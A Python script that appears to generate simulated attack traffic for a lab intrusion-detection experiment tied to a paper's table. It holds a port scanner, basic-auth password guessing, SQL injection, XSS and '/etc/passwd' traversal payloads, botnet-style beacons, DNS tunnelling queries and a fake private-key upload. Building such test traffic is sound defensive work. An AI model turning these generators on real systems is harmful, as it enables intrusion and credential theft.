#!/usr/bin/env python3
"""Attack generators matching paper Table II. Stdlib only; runs INSIDE a lab-attacker container.
Prints one JSON line: {"scenario": n, "t0": <unix time just before first malicious packet>, ...}
  python attacks.py --scenario 3 --target 172.28.0.10 --port 80
  python attacks.py --probe  --target 172.28.0.10 --port 80      # is the target reachable?
"""
import argparse, base64, json, os, random, socket, struct, time
from urllib.parse import quote

SQLI = "' UNION SELECT null,username,password FROM users--"


def raw_http(host, port, method, path, body=b"", headers=None, timeout=2.0):
    """Raw-socket HTTP/1.1 so no client library rewrites the payload."""
    h = {"Host": "target.corp.local", "Connection": "close", "User-Agent": "Mozilla/5.0"}
    h.update(headers or {})
    if body:
        h["Content-Length"] = str(len(body))
    head = f"{method} {path} HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in h.items()) + "\r\n"
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.sendall(head.encode() + body)
            s.settimeout(timeout)
            return s.recv(256)
    except OSError:
        return b""                       # blocked / reset / timeout after quarantine


def dns_query(name: str, qtype=1) -> bytes:
    hdr = struct.pack(">HHHHHH", random.randint(0, 65535), 0x0100, 1, 0, 0, 0)
    q = b"".join(bytes([len(l)]) + l.encode() for l in name.split(".")) + b"\x00"
    return hdr + q + struct.pack(">HH", qtype, 1)


def tunnel_name() -> str:
    token = base64.urlsafe_b64encode(os.urandom(40)).decode().rstrip("=")      # ~54 chars, high entropy
    return token + ".tunnel.corp.local"                                         # > 50 chars (Table II)


def exfil_body() -> bytes:
    pem = base64.encodebytes(os.urandom(4000)).decode()                        # ~5.4 KB > 5,000 B
    return ("filename=id_rsa&data=-----BEGIN RSA PRIVATE KEY-----\n" + pem +
            "-----END RSA PRIVATE KEY-----\n").encode()


def scen_recon(t, p):            # 10+ unique ports within 5 s, range 21-9200
    ports = random.sample(range(21, 9201), 14)
    t0 = time.time()
    for port in ports:
        try:
            socket.create_connection((t, port), timeout=0.2).close()
        except OSError:
            pass
    return t0


def scen_auth(t, p):             # 5+ HTTP 401 within 10 s
    t0 = time.time()
    for i in range(7):
        cred = base64.b64encode(f"admin:guess{i}".encode()).decode()
        raw_http(t, p, "GET", "/login", headers={"Authorization": "Basic " + cred})
        time.sleep(0.3)
    return t0


def scen_web(t, p, variant="sqli"):
    paths = {"sqli": "/search?q=" + quote(SQLI),
             "xss": "/search?q=" + quote("<script>alert(1)</script>"),
             "traversal": "/search?q=" + quote("../../../../etc/passwd", safe="/.")}
    t0 = time.time()
    raw_http(t, p, "GET", paths[variant])
    return t0


def scen_c2(t, p):               # beacon every 3.0 s
    t0 = time.time()
    for _ in range(3):
        raw_http(t, p, "POST", "/api/v1/heartbeat", b"beacon_id=BOTNET-77&status=alive",
                 {"Content-Type": "application/x-www-form-urlencoded"})
        time.sleep(3.0)
    return t0


def scen_dns(t, p):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    t0 = time.time()
    for _ in range(2):
        s.sendto(dns_query(tunnel_name()), (t, 53))
        time.sleep(0.05)
    return t0


def scen_exfil(t, p):
    t0 = time.time()
    raw_http(t, p, "POST", "/upload", exfil_body())
    return t0


SCENARIOS = {1: scen_recon, 2: scen_auth, 3: scen_web, 4: scen_c2, 5: scen_dns, 6: scen_exfil}


def probe(t, p, timeout=1.5) -> bool:
    try:
        socket.create_connection((t, p), timeout=timeout).close()
        return False                       # reachable -> not blocked
    except OSError:
        return True


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--scenario", type=int, choices=SCENARIOS)
    ap.add_argument("--variant", default="sqli")
    ap.add_argument("--target", default="172.28.0.10")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--probe", action="store_true")
    a = ap.parse_args()
    if a.probe:
        print(json.dumps({"blocked": probe(a.target, a.port), "t": time.time()}))
    else:
        fn = SCENARIOS[a.scenario]
        t0 = fn(a.target, a.port, a.variant) if a.scenario == 3 else fn(a.target, a.port)
        print(json.dumps({"scenario": a.scenario, "t0": t0, "t1": time.time(), "variant": a.variant}))
